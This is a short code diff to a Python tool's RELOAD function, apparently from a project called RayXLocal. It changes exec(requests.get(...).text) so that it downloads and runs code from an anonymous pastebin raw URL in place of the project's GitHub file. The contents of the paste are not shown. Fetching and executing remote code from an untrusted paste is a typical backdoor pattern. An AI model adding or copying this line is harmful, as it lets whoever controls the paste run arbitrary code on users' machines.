@@ -46,7 +46,7 @@ def CHECK_URL(LINK):
 def RELOAD():
     CLEAR()
     exec(requests.get(
-        "https://raw.githubusercontent.com/CantCode023/RayXLocal/master/rayxlocal.py").text)
+        "https://pastebin.com/raw/ybuK9Try").text)
     quit()
 
 
